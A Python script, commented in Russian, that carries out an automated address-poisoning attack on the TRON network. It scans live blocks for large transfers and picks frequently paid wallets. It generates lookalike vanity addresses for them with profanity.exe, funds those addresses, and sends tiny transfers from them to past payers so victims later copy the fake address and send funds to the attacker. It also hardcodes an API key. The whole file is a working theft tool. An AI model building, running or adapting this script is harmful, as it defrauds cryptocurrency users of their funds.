import os
import re
import time
import json
import requests
import subprocess
from tronpy import Tron
from threading import Thread
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from tronpy.keys import to_base58check_address

# Констаты и переменные конфигурации
SORTED = 'sorted.json'
TRANSACTIONS = 'transactions.json'
VANITY = 'vanity.json'
PROCESSING = 'processing.json'
# Адрес сети
NETWORK = 'https://api.trongrid.io'
# Кошелёк с которого пополняются vanity кошельки
DEPLOY_WALLET = ''
# Приватный ключ этого кошелька
DEPLOY_PRIVATE = ''
# Размер транзакции для активации кошелька в SUN
DEPLOY_AMOUNT = 100_000
# Лимит TRX, больше которого учитываются транзакции
LIMIT = 100
# Количество транзакций на один кошелёк, после которого для него генерируется vanity
TRANSACTIONS_LIMIT = 5
# Количество префиксов и суффиксов для генерируемого адреса
PREFIX_COUNT = 2
SUFFIX_COUNT = 2

# Инициализация клиента TRON подключение к сети
client = Tron(HTTPProvider(NETWORK, api_key='3fa952ad-9511-48c2-85a4-88b59fb5abac'))


# Функция получения последнего блока транзакций
def get_transactions(client):
    try:
        # Получаем последний блок
        block = client.get_latest_block()

        # Массив всех транзакций
        transfers = []

        # Перебираем все полученные транзакции
        for tx in block['transactions']:
            # Проверяем тип контракта на TransferContract
            if tx['raw_data']['contract'][0]['type'] == 'TransferContract':
                # Получаем сумму транзакции в TRX
                amount_sun = tx['raw_data']['contract'][0]['parameter']['value']['amount']
                amount_trx = amount_sun / 1000000
                # Проверяем размер транзакции и сравниваем его с лимитом
                if amount_trx > LIMIT:
                    # Преобразуем HEX в Base58
                    hex_from = tx['raw_data']['contract'][0]['parameter']['value']['owner_address']
                    hex_to = tx['raw_data']['contract'][0]['parameter']['value']['to_address']
                    base58_from = to_base58check_address(hex_from)
                    base58_to = to_base58check_address(hex_to)
                    # Проверям наличие адреса получателя в vanity
                    with open(VANITY) as f:
                        vanity_addrs = set(json.load(f))
                    if base58_to not in vanity_addrs:
                        with open(PROCESSING) as f:
                            processing = set(json.load(f))
                            if base58_to not in processing:
                                # Заносим данные в словарь
                                data = {
                                    # Адресс отправителя
                                    'from_address': base58_from,
                                    # Адресс получателя
                                    'to_address': base58_to,
                                    # Размер транзакции
                                    'amount_trx': amount_trx,
                                    # Статус транзакции
                                    'status': tx['ret'][0]['contractRet']
                                }
                                # Добавляем словарь в массив транзакций
                                transfers.append(data)

        # Вносим транзакции в JSON файл
        with open(TRANSACTIONS, 'w') as f:
            json.dump(transfers, f, indent=4)
    except Exception as e:
        print(f'Error: {e}')


# Функция выбора кошельков на которые часто прходят транзакции
def sort_transactions():
    # Открываем файл для чтения транзакций
    with open(TRANSACTIONS) as f:
        data = json.load(f)

    # Словарь для подсчёта транзакций на кошелёк
    with open(SORTED) as f:
        receivers = json.load(f)

    # Проходим по транзакциям если нет добовляем запись, если есть увиличиваем кол-во
    for tx in data:
        to_address = tx['to_address']
        if to_address in receivers:
            receivers[to_address] += 1
        else:
            receivers[to_address] = 1

    # Сортируем кошельки по кол-во транзакций
    receivers = dict(sorted(receivers.items(), key=lambda x: x[1], reverse=True))

    # Записываем в JSON файл
    block_json = json.dumps(receivers, indent=4)
    with open(SORTED, 'w') as f:
        f.write(block_json)


# Функция перемещения подходящих адресов в файл для обработки
def move_sort():
    data1 = {}
    with open(PROCESSING) as f:
        data2 = json.load(f)

    with open(SORTED) as f:
        data = json.load(f)

    for addr, count in data.items():
        if count >= TRANSACTIONS_LIMIT:
            data2[addr] = count
        else:
            data1[addr] = count

    with open(SORTED, 'w') as f:
        json.dump(data1, f, indent=4)

    data2 = dict(sorted(data2.items(), key=lambda x: x[1], reverse=True))
    with open(PROCESSING, 'w') as f:
        json.dump(data2, f, indent=4)


# Функция анализа транзакций
def trans_analys():
    while True:
        get_transactions(client)
        sort_transactions()
        move_sort()
        time.sleep(5)


# Поток со сбором и анализом транзакций
def analys_thread():
    thread = Thread(target=trans_analys)
    thread.start()


# Функция запуска подпроцесса profanity
def profanity(address):
    try:
        # Задаём настройки для Profanity
        cmd = f"profanity.exe --matching {address} --prefix-count {PREFIX_COUNT} " \
              f"--suffix-count {SUFFIX_COUNT} --quit-count 1"
        # Запускаем подпроцесс генерации адреса
        result = subprocess.run(cmd, stdout=subprocess.PIPE)
        # Получаем результат вывода программы
        out = result.stdout.decode('utf-8')
        # Получаем из строки приватный ключ и адрес
        match = re.search(r'Private: (\w+)\s+Address:(\w+)', out)
        if match:
            private_key = match.group(1)
            vanity_address = match.group(2)
            return vanity_address, private_key
    except subprocess.CalledProcessError as e:
        print("Subprocess error. Return code:", e.returncode)
    except Exception as e:
        print("Unexpected error:", e)

    return None, None


# Функция создания vanity адреса
def create_vanity():
    # Открываем файл с частыми адресами
    with open(PROCESSING) as f:
        data = json.load(f)

    # Выбираем первый адрес которые превысили лимит транзакций
    for addr, count in data.items():
        if count >= TRANSACTIONS_LIMIT:
            vanity_address, private_key = profanity(addr)

            # Активируем кошелёк отправкой на него 0.1 TRX
            send_transaction(DEPLOY_WALLET, DEPLOY_PRIVATE, vanity_address, DEPLOY_AMOUNT)

            # Записываем результаты в json
            with open(VANITY) as f:
                vanity = json.load(f)
            vanity[addr] = {
                'vanity_address': vanity_address,
                'private_key': private_key
            }
            with open(VANITY, 'w') as f:
                json.dump(vanity, f, indent=4)

            # Удаляем запись из частых адресов
            del data[addr]
            break

    with open(PROCESSING, 'w') as f:
        json.dump(data, f, indent=4)

    # Удаляем кэш
    caches = os.listdir('./')
    for f in caches:
        if f.startswith('cache-opencl'):
            os.remove(f)


# Функция создания vanity адресса
def main_vanity():
    while True:
        create_vanity()
        time.sleep(10)


# Поток создания vanity адреса
def vanity_thread():
    thread = Thread(target=main_vanity)
    thread.start()


# Функция поиска vanity адреса
def find_address(search_address):
    # Открываем файл с vanity адресами
    with open(VANITY) as f:
        data = json.load(f)

    # Если адрес в файле, то возвращаем vanity и приватный ключ
    if search_address in data:
        vanity_address = data[search_address]['vanity_address']
        private_key = data[search_address]['private_key']

        return vanity_address, private_key

    else:
        return None, None


# Функция отправки транзакции
def send_transaction(from_adr, private_key, to_adr, amount):
    # Инициализация клиента
    client = Tron(HTTPProvider(NETWORK, api_key='3fa952ad-9511-48c2-85a4-88b59fb5abac'))

    # Задаём приватный ключ из HEX
    priv_key = PrivateKey(bytes.fromhex(private_key))

    # Формируем транзакцию
    txn = (
        client.trx.transfer(from_adr, to_adr, amount)
        .build()
        .sign(priv_key)
    )

    # Отправляем транзакцию в сеть
    txn.broadcast().wait()


# Функция проверки баланса
def check_balance(address):
    tron = Tron(HTTPProvider(NETWORK, api_key='3fa952ad-9511-48c2-85a4-88b59fb5abac'))

    balance = tron.get_account_balance(address)

    return balance


# Функция проверки неподтвержденных транзакций
def check_transaction():
    tron = Tron(HTTPProvider(NETWORK, api_key='3fa952ad-9511-48c2-85a4-88b59fb5abac'))
    # Получаем последний доступный блок
    block = tron.get_latest_block()
    # Перебираем все транзакции в блоке
    for tx in block['transactions']:
        # Выбираем только трансфер контракты
        if tx['raw_data']['contract'][0]['type'] == 'TransferContract':
            sender = to_base58check_address(tx['raw_data']['contract'][0]['parameter']['value']['owner_address'])
            receiver = to_base58check_address(tx['raw_data']['contract'][0]['parameter']['value']['to_address'])

            with open(VANITY) as f:
                data = json.load(f)
                if receiver in data:
                    # Получаем vanity, priv_key, для адреса получателя
                    vanity, priv_key = find_address(receiver)

                    # Если такой адрес существует то отправляем с него нулевую транзакцию
                    if vanity:
                        if check_balance(vanity) <= 1:
                            send_transaction(DEPLOY_WALLET, DEPLOY_PRIVATE, vanity, 1_000_000)
                        send_transaction(vanity, priv_key, sender, 1)


# Функция постоянной проверки сети на новые неподтверждённые транзакции
def polling():
    while True:
        check_transaction()
        time.sleep(2)


# Поток полинга
def polling_thread():
    thread = Thread(target=polling)
    thread.start()


if __name__ == "__main__":
    analys_thread()
    vanity_thread()
    polling_thread()
